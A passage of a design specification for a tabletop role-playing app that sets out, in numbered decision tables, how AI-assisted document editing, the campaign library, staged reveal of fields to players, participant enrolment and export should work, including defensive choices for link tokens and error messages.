| CANVAS-19 | **Concurrency is judged per field**, where a field is a top-level key of the type's schema — a list, or the ability-score block, is one field. A write conflicts only when a field it touches changed after the write's base revision (CANVAS-34). A stale write touching untouched fields is rebased by the server, which re-validates the merged document against its type schema before committing; if the merge is invalid the *later* writer gets a 422 and its field enters `error`. This keeps the plan's guarantee — a stale write never overwrites newer work — without spurious conflicts while the GM types alongside an AI edit. `1kg.5.1`, `1kg.5.2` and `1kg.5.5` implement it; if field-level detection proves infeasible they amend this record rather than quietly fall back to whole-document locking. | P (refined) + I |
| CANVAS-20 | A real conflict (HTTP 409) puts the field in `conflict` and raises a banner, `This document changed elsewhere`. Each conflicting field shows both values with **Keep mine** (re-applies the GM's text on the latest revision as a new `gm` write) and **Use latest** (drops the local draft for that field). The local text is never discarded without one of those two choices. | P (`1kg.6.5` AC) + I |
| CANVAS-21 | **Asking the assistant to edit is explicit.** With a document open, a chat message is still a chat message. There are three arming gestures, one per scope: **Edit with assistant** in the canvas header (whole document) or **Edit again** on a finished edit's lane; a field's own **Edit with assistant** control (that field); and a `SelectionBar` action (the selection — CANVAS-23). Arming shows a target row above the composer — `Editing <title> · whole document` — and Send reads `Edit document`. | I (the handoff says "ask in chat" without saying how chat knows) · **E-9** |
| CANVAS-22 | An armed edit is **one-shot**: the target clears after each submit, so an unrelated follow-up can never become an accidental edit. **Tool-armed and edit-armed are mutually exclusive.** Arming a tool clears an armed edit, and says so. Arming an edit over a draft that parses as a command is refused with `Clear the /command first`. Closing or switching the canvas clears the target **in every conversation**, which is the one case where RAIL-25 does not bring an armed edit back. While an edit is armed, slash parsing is off and Escape clears the target, never the draft. | I |
| CANVAS-23 | `SelectionBar` actions (`Rewrite`, `Shorter`, `Darker`) are complete requests and run on click, scoped to the selection. The bar works on a field's **read presentation**; selecting text does not enter edit mode. A selection must lie inside a single editable prose field; one spanning fields raises no bar. A keyboard selection raises the bar too; the bar follows its field in the tab order, and Escape dismisses it. | S + I |
| CANVAS-24 | During an AI edit the fields in its scope are **read-only** (`Assistant is editing…`); every other field stays editable. Dirty fields are flushed first, and a failed flush blocks the edit. One AI edit per document at a time (X-5). Cancel is on the lane. The lane's badge reads `EDIT · v<n>`. | S (badge) + I |
| CANVAS-25 | Edit outcomes: success updates an open canvas in place and links the document from the lane; if the GM has switched documents meanwhile the canvas does **not** swap back. A no-op patch says `No changes were needed` and creates no version. A conflict says `The document changed while the assistant was working. Nothing was overwritten.` and offers **Try again**, which runs at once on a fresh base (X-1). | P (`1kg.5.5` AC) + I |

### 5.5 Versions, restore, the gold wash and media

| ID | Decision | Basis |
| --- | --- | --- |
| CANVAS-26 | Restore is additive: it appends a new version whose content equals the chosen one. It is guarded (CANVAS-16) and needs no other confirmation, because nothing is lost. | S + I |
| CANVAS-27 | The history list pages 20 entries at a time, newest first, and shows label, summary, author (`You` or `Assistant`), time and changed fields. Times are ISO timestamps on the wire, formatted on the client; the handoff's pre-formatted `"7:36 PM"` is rejected. | S + I |
| CANVAS-28 | **The gold wash marks a change that arrived live in this client** — the response to an edit the GM just ran, or a restore. Hydrated and reloaded documents never show one. | I (replaces "until the next turn") |
| CANVAS-29 | The wash clears by **acknowledgement**: the GM edits any field, runs another edit, presses **Got it** in the canvas header, or closes or switches the document. An unrelated chat turn does not clear it. The history list keeps every version's changed fields permanently, so nothing is lost when the wash goes. | P (`1kg.5.5` AC) + I |
| CANVAS-35 | A **media card expands into a modal viewer** — focus trapped, Escape closes, focus returns to the card. It never opens the canvas in v1. The handoff's README promises a "take-strip" that ships nowhere in the archive; v1 returns one result per invocation. | S ("canvas optional") + I + N |

### 5.6 Persistence, closing and deep links

| ID | Decision | Basis |
| --- | --- | --- |
| CANVAS-30 | Workspace state rides in the URL **fragment** as opaque IDs — campaign and open document — following the invite-link precedent: a fragment never reaches the server or its logs, and needs no router or proxy change. The client writes it with `replaceState` only. A fragment change made outside the app is a switch gesture and runs the loss guard; **Keep editing** restores the fragment. There is one fragment grammar, owned by `1kg.6.3`. | R + I |
| CANVAS-31 | On reload the client restores the campaign and the document after the normal session check. Authorisation is re-checked server-side. A missing, archived-and-deleted or unauthorised document yields one generic state, `This document isn't available`, with a link to the library. It never reveals which case applied. | P (non-enumerating) + I |
| CANVAS-32 | Closing the canvas (guarded) re-expands `LeftNav` and returns focus to the control that opened it, or to the composer if that control is gone. | P (`1kg.6.1` AC) + I |
| CANVAS-33 | **Closing, hiding or switching the canvas never stops a reveal.** Reveal is server state (§7); the workspace indicator stays and names what is live. | S (two indicators) + I |

## 6. Campaign Library

**Supplied.** One sentence: `LeftNav` gains "the Campaign Library group (NPCs,
Bestiary, Documents, Session log, Cues)", and switching documents "happens in
the campaign library". Only those five names are supplied. No screen, list,
search, create or delete flow was; everything else below is inferred, including
where a row says `S + I`.

### 6.1 Categories

| ID | Category | Contains | Basis |
| --- | --- | --- | --- |
| LIB-1 | NPCs | `npc` | S (name) + I |
| LIB-2 | Bestiary | `statblock` | S (name) + I |
| LIB-3 | Documents | `handout`, `quest-log`, `character-sheet`, `lore`, `encounter`, with a type filter | S (name) + I |
| LIB-4 | Session log | `session-notes`, newest session first | S (name) + I |
| LIB-5 | Cues | audio cues — not documents; the category appears only while the audio capability is enabled | S (name) + P |
| LIB-6 | — | Category membership is a registry field on each document type, not a list in the component. There is no media gallery in v1: a saved image is reached from the document it is attached to, or from its timeline card. | I + N |

### 6.2 Where the library renders

| ID | Decision | Basis |
| --- | --- | --- |
| LIB-7 | The library is a **320 px panel** that opens beside `LeftNav`. On the wide layout it **overlays the chat column** — never the canvas — so the GM can browse with a document open. On the medium layout it overlays whichever column is showing. It never pushes layout. | I |
| LIB-8 | Expanded `LeftNav` shows the group with its five rows. The collapsed 56 px rail shows **one** Campaign Library icon with a tooltip and an accessible name; the five categories are tabs inside the panel. Five extra rail icons would not fit a 768 px-tall window beside the channels and conversations. The group appears only in GM mode (X-9). | S + P (`1kg.6.4`: labelled access) + I |
| LIB-9 | The panel is non-modal. Escape, its close button, the same rail icon, or a click on the chat column dismisses it, and focus returns to the control that opened it. Opening a document does **not** dismiss it. | I |
| LIB-10 | On the narrow layout the library is a full-screen view with a back control, and opening a document goes to the full-screen canvas (§10). | I |

### 6.3 Create, read, update, delete

| ID | Operation | Behaviour | Basis |
| --- | --- | --- | --- |
| LIB-11 | Create by tool | `/npc`, `/encounter` and `/recap` create documents; a monster card's **Save to Bestiary** promotes it to a `statblock` document. Promotion is idempotent per source timeline entry: a second press opens the existing document, and the button then reads **Open in Bestiary**. | P (`1kg.5.6`) + I |
| LIB-12 | Create by hand | **New** in a category creates a document with `author: gm`, named `Untitled <type>` with the name selected for typing, and opens it in the canvas (guarded). All eight types can be created by hand. A stat block first asks for its name, AC and HP in a small dialog, because a stat block without them is not valid; nothing is stored until they are given. | P (`1kg.6.4` AC) + I |
| LIB-13 | Stat-block policy | A promoted or hand-made stat block is a **full versioned document**: editable through a structured editor, AI-editable at document and field scope, and at selection scope inside prose entries only. | P (`1kg.5.6`: "the decided policy") + I |
| LIB-14 | Open | In the four document categories, activating a row opens it in the canvas under CANVAS-5 to CANVAS-7. In **Cues**, activating a row expands the cue's card inside the panel: audio never opens the canvas. | S + I |
| LIB-15 | Rename | By editing the name field in the canvas, which is an ordinary versioned edit — the handoff's `GameDocument` commits the name the same way. Rows have no inline rename, so there is one path. | S + I |
| LIB-16 | Archive | From the row's overflow menu. Immediate, with an **Undo** toast for 8 s. Archived documents leave the default list and appear under the Archived filter, where they can be restored. An open archived document stays open under an `Archived` banner with **Restore**. Undo and Restore bring back the document only — never a reveal that LIB-17 stopped. | I |
| LIB-17 | Archive while revealed | The one case that asks first — `The table is seeing this. Archiving stops showing it.` — because players are affected. The reveal is stopped and the document archived in one transaction. | X-2, X-3 + I |
| LIB-18 | Delete | Only from the Archived filter, behind a dialog naming the document: `This permanently deletes <title> and its whole history. This can't be undone.` Retention and cascade rules belong to `1kg.2.6` and `1kg.1.3`. | P (`1kg.6.4` AC) + I |
| LIB-19 | Duplicate, bulk actions, folders, tags management | Not in v1. | N |
| LIB-26 | Cues | **Upload** takes a title and a kind; the kind is then immutable (AUDIO-4). **Rename**, **Archive** and **Delete** work as for documents, and archiving a live cue stops it first behind the same kind of dialog as LIB-17. **Add to thread** posts the cue's card into the GM thread as a lane authored `You · attached` with the badge `AUDIO CUE`, as the handoff's example shows. | S (the example) + I |

`1kg.6.4`'s AC asks for "archive/delete with confirmation". LIB-16 to LIB-18
read that as: a dialog for delete and for archiving something the table can see
or hear, and Undo for a plain archive, which is reversible from the Archived
filter anyway.

### 6.4 Search, sort, filter and paging

| ID | Decision | Basis |
| --- | --- | --- |
| LIB-20 | Search runs **on the server**, inside the current campaign and category, after a 250 ms debounce and at least two characters. It matches name, qualifier and tags, case-insensitively. The search text travels in a request body, never a query string (X-7). | P (`1kg.6.4`: server search) + I |
| LIB-21 | Full-text search over document bodies and a single search across every category are not in v1. `1kg.5.1` should not build indexes that preclude them. | N |
| LIB-22 | Sort: **Recently updated** (default) or **Name A–Z**. Filters: Active or Archived everywhere, plus document type in Documents. | I |
| LIB-23 | Paging is cursor-based, 25 rows at a time, behind a **Load more** button — not infinite scroll, which is hostile to keyboards and to deterministic tests. Each sort has a stable total order with the ID as its tiebreaker. | P (paginated, stable order) + I |
| LIB-24 | After a tool creates a document, or a save renames one, the acting tab updates its open list in place by ID. No realtime channel is needed for this: a second GM tab refreshes its lists on focus. | I |
| LIB-25 | **Switching campaign** runs the loss guard, closes the canvas and the panel, and clears every list at once. Lists are keyed by campaign ID and a response for another campaign is dropped, so a stale row can never flash. | P (`1kg.6.4` AC) + I |

## 7. Reveal: staging, defaults, active content and un-reveal

**Supplied.** Everything is private until revealed, and reveal is per field.
Each type declares a `defaultReveal` mask. `RevealSheet` has toggles, Cancel and
a Confirm button labelled `Reveal`. "Un-revealing is one tap and takes effect
immediately." There is one link per campaign; the player route "renders only the
masked fields of whatever is currently revealed"; the link "expires with the
session". An indicator sits in both the chat header and the canvas header.
**Contradictions and defects.** Staged Confirm and immediate un-reveal are never
reconciled. `revealFieldsFor` omits stat cells, so the NPC default `voice` has no
row; its `Name & voice` row toggles only `name`; the demo groups `Wants &
leverage` into one row while the helper emits two. `data.revealed`,
`CanvasPane.revealed` and the wire `reveal_mask` are three unconnected states,
and because the wire sketch puts a mask on *each document*, it would let several
documents be live at once. In `CanvasPane.jsx` the whole revealed pill is one
button bound to `onStopReveal`: a stray click stops the reveal, and nothing
reopens the sheet for a live document. The example link,
`aetheril.app/t/marsh-9k2f`, is a slug plus four characters.

### 7.1 State model

For each table session the server holds **audience slots** (§8): one for the
table and one for each participant. A slot is empty or holds **one live
projection**: a document, a *pinned* version and an explicit field mask. A
document is live in at most one slot. `staged` exists only in the GM's browser.

Two kinds of counter keep this safe, and they are deliberately different:

- a **session reveal epoch**, seen only by the GM's client. Every widening
  carries the newest epoch that client has seen; every committed widening and
  **every narrowing** advances it. Audio has a twin, the audio epoch (AUDIO-28).
- a **sequence per slot**, sent only to clients entitled to that slot, so they
  can order and de-duplicate what they receive. Session-level state — table
  audio on or off — has a session sequence of its own.

A GM has **at most one live table session at a time, across campaigns**;
starting another offers to end the first. The live indicators therefore always
speak for one session, and name its campaign when it is not the one on screen.

| ID | Decision | Basis |
| --- | --- | --- |
| REVEAL-1 | **Reveal needs a live table session.** With none, **Reveal to party** opens the sheet in a `Start a table session` state that explains the link and offers **Start session**. Starting a session reveals nothing. | P + I |
| REVEAL-2 | One live session per GM, and so per campaign. It ends when the GM ends it or 12 hours after it starts (*suggested*; `1kg.2.3` owns the number). | S ("expires with the session") + I |
| REVEAL-3 | **The sheet is always a staged draft.** Toggles change only the draft; nothing is sent until Confirm. Cancel, Escape and an outside click discard it. | S (Cancel and Confirm exist) + P (defaults only seed a draft) |
| REVEAL-4 | Draft seeding is **per document and per audience**, first match wins: the live mask, if this document is live to this audience; otherwise the type's default **for that audience**. That default is `defaultReveal` for the type's own audience, and **empty** for the table audience of an owner-audience type — the handoff wrote `['all']` for a character sheet's owner, not for the room. Every seed is intersected with the fields that exist, are non-empty and are revealable. Changing the audience picker re-seeds the draft and says so. A mask used earlier in the session is *not* remembered: after a panic Stop it would pre-tick the very field that was the mistake. | S + I |
| REVEAL-5 | **Confirm** is one atomic mutation carrying the document, the **sealed** version the sheet displayed (CANVAS-34), the explicit mask, the audience and the reveal epoch. **Every ticked row previews the exact text it will publish**, so what the GM sees in the sheet is what the table gets. The server refuses a mask key that is empty in the named version. The button names its effect: `Reveal to the table`, `Reveal to <alias>`, `Update`, `Reveal and replace` or `Move to <audience>` (REVEAL-7). It is disabled for an empty mask on a hidden document; on a live document an empty draft turns it into `Stop showing`, which is a Stop and carries no epoch. **Once a Confirm has been sent the sheet stays open; Cancel, Escape and an outside click are inert, and the only enabled control is Stop showing.** While a Confirm is still *waiting* to be sent (REVEAL-22), Cancel withdraws it. | I |
| REVEAL-6 | **Stop showing** is the immediate control: one tap, no dialog, idempotent (X-3). The canvas header and the sheet stop *that document*. The workspace indicator stops **every reveal** — every audience slot of the session in one call — and reads `Stop showing` when one document is live and `Stop all (n)` otherwise. Audio has its own Stop beside it (AUDIO-31). The supplied "one tap… immediately" is read as describing this control. Hiding a single field is sheet, toggle, `Update`. One staged form plus one panic button is easier to reason about, and to test, than toggles that are instant in one direction only. | S + I |
| REVEAL-22 | **A Stop defeats every widening issued before it in that session, in either arrival order.** Every narrowing — a Stop, an End, a Rotate, archiving or unlinking something live, removing a participant, switching table audio off — advances the epoch, on an empty slot too. A Stop clears a slot only if it holds what the Stop names; `Stop all` clears every slot. A widening based on a stale epoch is a 409 and is **never retried automatically**: the GM confirms again. **A Stop is sent at once and is never queued** behind anything. A widening is sent only when none of this client's Stops is unacknowledged — so an ordinary stop-then-reveal does not trip over itself — and while it waits the GM can withdraw it. | X-3 + I |
| REVEAL-7 | **One live document per audience slot.** Revealing B while A is live in that slot replaces A, and the sheet says so first: `This replaces <A>, which the table is seeing now.` Revealing a document that is live to another audience *moves* it, and the sheet says that too. Players get no shelf or history of earlier reveals. | I (the supplied wire sketch would allow several) · **E-2** |
| REVEAL-8 | **The table sees a pinned version.** Direct edits, AI edits and restores never change what players see. **On a live document the sheet works against the pinned version, however it was opened**: changing the mask keeps the pin, and a newly ticked row previews the pinned text. When a *revealed field's text* differs in the latest version, the indicator adds `Table is seeing an earlier version` with **Update…**, and the sheet offers **Use latest version**, which lists every ticked field with old text beside new; Confirm then pins the version displayed. The comparison is of text, not of version numbers, so ten autosaves raise one notice and reverting the text clears it. There is no one-tap update. Following the current version was rejected: an AI rewrite of a revealed field could carry a secret from a hidden one to the table with no review. | X-2 + I · **E-3** |
| REVEAL-9 | A mask lists individual field keys taken from the type's revealable allowlist; an unknown key is a 422. **`all` is never stored**: the client expands it into the fields that exist now, so a field added later is never revealed by a wildcard. | P (`1kg.7.1`, `1kg.7.2`: masks validated against the type) + I (no stored wildcard) |
| REVEAL-10 | **Revealable:** portrait, name, qualifier, each stat cell, each section. **Never revealable:** tags, sources and citation text, version history, authorship, changed-field lists, asset metadata, and any ID the projection does not need. | I |
| REVEAL-11 | Each revealable field gets its own row unless the registry declares a **reveal group** — one labelled row toggling a fixed set of keys, which is how the handoff's `Name & voice` and `Wants & leverage` become real. The stored mask still lists individual keys. Warning sub-lines (`Would spoil the lie`) come from a per-field registry flag with type-specific copy, not from a key list hard-coded in the component. | S-defect + P (`1kg.7.3` AC) + I |
| REVEAL-12 | List fields — quest threads, beats, combatants — reveal as a whole. Per-item reveal is not in v1. | N |
| REVEAL-23 | **In v1 `session-notes` seeds empty**, and its `recap` row carries the warning `Summarises your private GM thread`. The supplied default of `['recap']` assumed a table transcript; with no player turns (E-5) the conversation a recap reads is the GM's private one. Restore the supplied default only if E-5 changes. | I (overrides S) |
| REVEAL-13 | The document's `GM ONLY` or `REVEALED` badge and the canvas header both derive from the **server's live projection**. `data.revealed` is dropped. Revealed fields carry an eye marker in the canvas, so the GM sees exposure while editing. **When the GM's client cannot confirm the state, the indicator reads `Reveal state unknown — reconnecting`, never "nothing revealed".** | P (`1kg.7.3`: server mask is the source of truth) + I |
| REVEAL-14 | **One workspace indicator lists every live projection** — `Revealed · Ondrey (table) · +1 private` — in the workspace header (the `AppHeader` row that holds the channel switcher), on every layout and in every channel, and it stays operable above any modal. Stop is always a **separate** button. In the GM channel each listed projection opens *that document's* sheet as a dialog, without swapping the canvas. **In Sage, Spell and Rules the indicator is Stop-only**: a listed projection takes the GM back to the GM channel instead, so no reveal can be widened from outside it (X-9). The canvas header repeats the state of the document it shows, as two controls; the supplied `CanvasPane` pill, one button where a stray click on the summary stopped the reveal and nothing reopened the sheet, is rejected. | S (two places; `RevealIndicator` already separates Stop) + I |
| REVEAL-15 | A stale widening is a 409: the sheet reloads live state, **keeps the GM's draft toggles**, and says `Reveal changed — check and confirm again`. Stop showing never conflicts. | P (`1kg.7.2` AC) + I |
| REVEAL-16 | If a Stop cannot reach the server, the indicator becomes `Couldn't stop showing — retrying` and retries with backoff, and the GM is told plainly that the table may still see it. An unacknowledged Stop blocks unload and leaves an opaque pending-stop marker, scoped to its session and epoch, that is replayed first on the next load — and dropped instead if that session has ended or its epoch has moved on, so it can never kill a later, deliberate reveal. A 401 during a live reveal says `The table can still see <title>`, and Stop is the first thing offered after signing in. | X-3 + I |
| REVEAL-17 | Ending or expiring a session clears every projection at once and kills the link. A new session starts with nothing revealed. **Rotate link** replaces the token, disconnects every table client and clears every projection, but it is the *same* session: its divider and the recap boundary do not move. Rotate offers `Also reset personal links`. | P + I |
| REVEAL-18 | **Table audio** is a session-level switch in the sheet's link section, shown only while the audio capability is enabled and **on by default** — nothing sounds until the GM pushes a cue and a player has tapped. It is not part of any document's mask. Turning it off stops any live cue and blocks pushes. | S ("its own toggle") + I |
| REVEAL-19 | **The table link carries its token in the URL fragment**, which the client reads once and strips from the address bar, as the invite flow does. **No table credential ever appears in a request URL — path or query — for the API, the realtime channel or an asset.** A header alone cannot meet this, because native `EventSource`, `WebSocket`, `<img>` and `<audio>` cannot send one; the mechanism — for example one POST that exchanges the token for an `httpOnly`, `SameSite=Strict`, path-scoped cookie — belongs to `1kg.1.3` and `1kg.1.4`. Whatever it is, the device then holds a **session-scoped table credential until End, Rotate or expiry**, so a reload or a discarded tab does not lock a player out. The token is high-entropy and stored hashed. The supplied `/t/<campaign-slug>` form is rejected: it is guessable, and a path token lands in request logs. | P + R + I (rejects S) |
| REVEAL-20 | The sheet shows the host and a shortened token; **Copy link** copies the whole URL. The **QR code is rendered in the browser** — never by a third-party QR service, which would receive the token. | I |
| REVEAL-21 | Projection responses are `Cache-Control: no-store`, built server-side from the allowlist, and never derived by filtering a private payload on the client. **A table asset reference — a portrait, a cue — stops working promptly after a Stop, an End or a Rotate**: at once if the service authorises each read against the live slot, or within a short bounded lifetime (*suggested* 60 s at most) if `1kg.1.4` delegates reads to single-asset signed URLs. That choice is `1kg.1.4`'s: proxying all table media through a service capped at 2 × 20 requests has a real cost, and a long-lived signed URL is ruled out either way. Responses are `no-store`. Player-safe export and print use the same builder (EXPORT-3, EXPORT-7). | P + I |
| REVEAL-24 | **No client can infer activity in a slot it is not entitled to** — not from a payload, a gap, a counter, or a forced re-snapshot. Slot sequences are per slot and go only to entitled clients; the reveal epoch never leaves the GM's channel. | P (`1kg.7` AC: cannot access owner-only data) + I |
| REVEAL-25 | **Table connections are bounded per session and across the whole service.** *Suggested:* 12 per session, 3 per device, and a service-wide ceiling that always leaves at least half the request capacity for login and chat — or realtime moves off the request-serving instances altogether. Beyond a bound the client sees `This table is full`. Production is two instances of twenty concurrent requests for everything, so a per-session bound alone would let three tables starve it. Only *failed-token* attempts are throttled per source, so an in-person table behind one NAT is not punished. The numbers and the topology are `1kg.1.4`'s. | R + I |

### 7.2 What a player sees

| ID | State | Table client shows | Basis |
| --- | --- | --- | --- |
| TABLE-1 | joining | `Joining the table…` | I |
| TABLE-2 | waiting | `Nothing to see yet. Your GM hasn't shared anything.` | I |
| TABLE-3 | showing | The read-only document with only the masked fields. No GM chrome, no badge, no empty headings, no portrait frame when there is no portrait. Every label — the page title included — is built from the projection, so the document's name appears only if `name` is in the mask. | P (`1kg.7.4` AC) + I |
| TABLE-4 | replaced | The content swaps, with a polite announcement: `Your GM shared something new`. | I |
| TABLE-5 | stopped | Back to waiting. | S + I |
| TABLE-6 | reconnecting, silent for up to 10 s | Content stays. A `Reconnecting…` banner appears 2 s after a transport error, or once silence exceeds the heartbeat interval by 2 s — so neither a healthy stream nor a routine reconnect (the platform cuts every stream at 300 s) makes it flash. | I |
| TABLE-7 | silent for more than 10 s | Content is hidden: `Reconnecting… hidden until the connection is back` (X-4). The grace runs from the **last byte received**, with a heartbeat of at most 5 s (*suggested*), so a half-open connection cannot stretch it. On reconnect the client takes a fresh snapshot and trusts nothing it held. | X-4 + I |
| TABLE-11 | the page is hidden, frozen, or restored from the back-forward cache | Content is blanked **at once** — a locked phone must not repaint a stale secret on unlock — and returns only after a fresh snapshot. | X-4 + I |
| TABLE-8 | the session ends while joined | `This session has ended. Thanks for playing.` | I |
| TABLE-9 | cold load with an ended, expired, rotated or invalid token; or the link is rotated while joined | One generic screen: `This table link isn't active. Ask your GM for a new one.` It never says which case applied. | P (non-enumerating) + I |
| TABLE-10 | too many failed attempts from one source | `Too many attempts. Wait a moment and try again.` | P + I |
| TABLE-12 | the session is at capacity | `This table is full. Ask your GM to make room.` | I |
| TABLE-13 | a valid table token with an unknown or revoked enrolment credential | Joins as a guest with one neutral line, `You've joined as a guest.` It never distinguishes unknown from revoked. | P (non-enumerating) + I |
| TABLE-14 | the private `For you` slot | Absent while empty. When the GM reveals to this participant it appears above the table's document; it swaps on replace and disappears on Stop, with the same announcements as TABLE-4 and TABLE-5. | I |
| TABLE-15 | a personal link has just enrolled this device | `You're set up as <alias>. Open your GM's table link to join.` Enrolling does not join a table: an enrolled player still opens the table link each session, and again after a Rotate, and the device credential rides along by itself. | I |
| TABLE-16 | a personal link whose code is used, replaced, expired or invalid | One generic line: `This personal link isn't active. Ask your GM for a new one.` Nothing is enrolled, and it never says which case applied. | P (non-enumerating) + I |

The table client is its own HTML entry point and bundle. It is mobile-first and
read-only, persists no revealed content, and loads none of the authenticated
application's code or state.

## 8. Character-owner versus campaign-wide audiences

**Supplied.** `character-sheet` declares `audience: 'owner'` — "shared with its
owner, not the table" — with `defaultReveal: ['all']`, alongside "one link per
campaign". **Contradiction.** A shared bearer link cannot prove who holds it, so
"owner" cannot be enforced with that link alone. This is a logical gap, not a
missing detail. And because the table's QR code is shown to the whole room, the
realistic adversary for an owner-only document is *another player*.

### 8.1 Decisions

| ID | Decision | Basis |
| --- | --- | --- |
| AUD-1 | v1 has three kinds of party: the campaign **owner**, a `dm`-role account and the campaign's only GM; **participants**, table aliases the GM creates, which are *not* accounts; and **guests**, anyone holding the table link. Players never need an account — the pilot is invite-only, and a phone at the table should not need an invite. Epic `agent-forge-harness-yje` plans to replace invites with open registration; that removes the invite half of this argument and leaves the other half standing: a player glancing at a phone should not have to register. Co-GMs are not in v1. | R + I · **E-6** |
| AUD-2 | There are two audiences: `table`, and `participant:<id>`. | I |
| AUD-3 | Options considered for owner proof: (a) drop the owner audience in v1; (b) enrol each participant's device through a personal link; (c) player accounts. **Chosen: (b)**, falling back to (a)'s behaviour for any participant who has not enrolled. (c) would put accounts, invites and password recovery in front of every player. | I · **E-1** |
| AUD-4 | A **personal link carries a single-use enrolment code** in its fragment and no session token, so the GM can send it at any time, with no session running. The first open exchanges the code for a device credential — the server keeps only a hash — strips the fragment, and kills the code (TABLE-15). A code that is never used expires after 7 days (*suggested*). A reusable personal link was rejected: it would be pasted into group chats, and a personal QR can be photographed across a table. | I |
| AUD-5 | Owner-audience content needs **both** a live table session and the enrolled device credential; the credential alone opens nothing. **One active device per participant:** enrolling a second device replaces the first, and the GM sees `<alias> joined from a new device`. **Reset personal link** revokes the device and issues a fresh code. This credential is the one thing a player's device keeps (X-4). Entropy, hashing and storage are `1kg.1.3`'s. | I |
| AUD-6 | This is not "a reveal link for every document", which stays a non-goal: a personal link is per person, and there is still one table link. | S + I |
| AUD-7 | **Guests are anonymous.** There is no name prompt and no free-text identity in v1, which avoids anonymous-supplied names, PII and abuse. Identity comes only from enrolment. This narrows `1kg.7.4`'s "participant name/audience entry" and `1kg.2.3`'s "participant display identities". | I · **E-10** |
| AUD-8 | Slots: one table slot, plus one private slot per participant. A player sees the table's document and, under `For you`, their own (TABLE-14). | I |
| AUD-9 | The sheet shows an audience picker **only** for types whose registry entry says `audience: owner`: `<participant> only` (default; the sheet must be linked to a participant) or `Whole table`. Every other type is table-only in v1. A secret note to one player is a natural extension of the same mechanism and is not in v1. | S + I + N |
| AUD-10 | A reveal to a participant whose device is not enrolled, or not connected, confirms normally; the GM sees `<alias> hasn't joined yet`, and nothing is delivered until they do. It **never** falls back to the table. | X-2 + I |
| AUD-11 | Aliases are visible to the GM, and each participant sees only their own. They never appear in payloads sent to other table clients, in logs, in traces or in metric labels. | P |
| AUD-12 | `defaultReveal: ['all']` on a character sheet seeds the *owner* audience only (REVEAL-4); it is still staged, and still expanded to explicit keys (REVEAL-9). | P + I |

### 8.2 Participants

Participants live in a **Participants** panel under the campaign's settings, in
GM mode only. It behaves like the library panel (LIB-7, LIB-9).

| ID | Operation or state | Behaviour | Basis |
| --- | --- | --- | --- |
| AUD-13 | Add | An alias of 1–40 characters, unique within the campaign, and optionally a linked character sheet. | I |
| AUD-14 | Rename | GM only. Presence labels follow at once. | I |
| AUD-15 | Link or unlink a character sheet | A sheet links to at most one participant. Unlinking stops a live private projection of it first, in one transaction. | X-3 + I |
| AUD-16 | Remove | Behind a dialog. It stops any live private projection, revokes the device credential and keeps the character-sheet document. | X-3 + I |
| AUD-17 | Personal-link status the GM sees | `Not sent` — no code issued. `Waiting` — a code exists and is unused. `Joined · <last seen>`. `Joined from a new device <when>` — shown once after a replacement. **Copy personal link** and **Show personal QR** issue a code; **Reset personal link** revokes and re-issues. | I |
| AUD-18 | Empty, loading, error | `No participants yet. Add the players who need a private view.` Skeleton rows. `Couldn't load participants`, with **Retry**. | I |

## 9. Export

**Supplied.** `CanvasPane` has an `onExport` handler, wired to `exportPdf` in
the usage note, and `handout` is `printable: true`. Nothing says what an export
contains. **Repository.** Chat export writes JSON while `ui/README.md` calls it
Markdown.

### 9.1 Decisions

| ID | Decision | Basis |
| --- | --- | --- |
| EXPORT-1 | **Export opens a menu**, never a one-click download, because choosing between a private and a player-safe file is a safety decision. | I |
| EXPORT-2 | Variants: **GM copy** (Markdown, every field); **Player-safe copy** (Markdown, a confirmed mask); **JSON** (GM copy only); **Print…**. | P (`1kg.6.6`) + I |
| EXPORT-3 | The player-safe mask is chosen in a staged dialog seeded like a reveal draft for the type's own audience (REVEAL-4); opening it seals the working version (CANVAS-34). **The dialog previews the exact text that will leave**, not just field names. When the document is live, the default source is **What the table sees** — the pinned version with the live mask — so an export cannot hand players an unreviewed rewrite that the pin was holding back (REVEAL-8). The GM may choose the current version instead, and sees its text first. The file is built **on the server by the same allowlist projection builder as the table view**, so one canary suite covers both exits. | P + I |
| EXPORT-4 | A GM copy opens with a banner line: `GM ONLY — contains secrets`. | I |
| EXPORT-5 | JSON is the current version's typed payload with its schema version, type and version metadata. It carries no history, no reveal state, no asset bytes and no IDs of other resources. | I |
| EXPORT-6 | **PDF is the browser's print-to-PDF** over a print stylesheet. The service gains no PDF renderer or headless browser. | I + N |
| EXPORT-7 | Print offers the same two variants. A player-safe print renders the **same server-built projection** in a dedicated view — never the private document with parts hidden by CSS — and the canary suite asserts on it. `printable: true` types default to the player-safe layout with no application chrome; a printed GM copy carries a `GM ONLY` running header. | S + I |
| EXPORT-8 | An export is of the current **saved** version, or of the pinned version under EXPORT-3; the loss guard flushes first. Exporting any other older version, bulk or whole-campaign export, and a zip with images are not in v1. Markdown names the portrait asset and embeds no bytes, and a player-safe copy strips remote image syntax (X-10). | I + N |
| EXPORT-9 | Filenames are `<campaign>-<document>-<gm or players>-<yyyymmdd>.<ext>`: ASCII-folded kebab case, each slug at most 40 characters, falling back to `document`, with path and reserved characters stripped. No IDs, tokens or other user text. **A player-safe filename, page title and print header are built from the projection:** the document's name appears only if `name` is in the mask; otherwise the type's label stands in. | P (`1kg.6.6`: safe, stable) + I |
| EXPORT-10 | Export endpoints are GM-authenticated and owner-scoped. Table clients have no export. Telemetry records variant and type only. | P |
| EXPORT-11 | Inline cards: a monster card has **Save to Bestiary** (LIB-11). Loot, names, hooks and rules cards have **Copy** only; saving them as documents is not in v1. | I + N |
| EXPORT-12 | **Chat export stays JSON** — it is what ships and what is tested. The README's "Markdown" is a documentation bug for `1kg.6.6` or `1kg.9.7`. When the typed timeline lands, a GM-thread export carries document **titles and links only, never bodies**, so chat export cannot become a second path for secrets. | R + P + I |

### 9.2 The export flow

Basis for the whole table: I.

| Step | GM copy, JSON | Player-safe copy | Print |
| --- | --- | --- | --- |
| 1. Export pressed | the guard flushes; the menu opens | the same | the same |
| 2. Variant chosen | — | the dialog opens on **What the table sees** when live, else on a seeded draft; toggles are staged; the exact text is previewed | the variant is chosen as in the other two columns |
| 3. Confirm | `Preparing export…` | `Preparing export…` | the print view renders, then the browser's dialog opens |
| 4. Done | the file downloads; focus returns to **Export** | the same | focus returns to **Export** when the dialog closes |
| Failure | `Couldn't export`, with **Retry**; nothing partial is downloaded | the same, and the staged mask is kept | `Couldn't prepare the print view`, with **Retry** |

## 10. Desktop and mobile layouts

**Supplied.** With the canvas open: `LeftNav` collapses to a 56 px icon rail,
the chat column is fixed at 472 px — "the floor at which a `ChatMessage` plus its
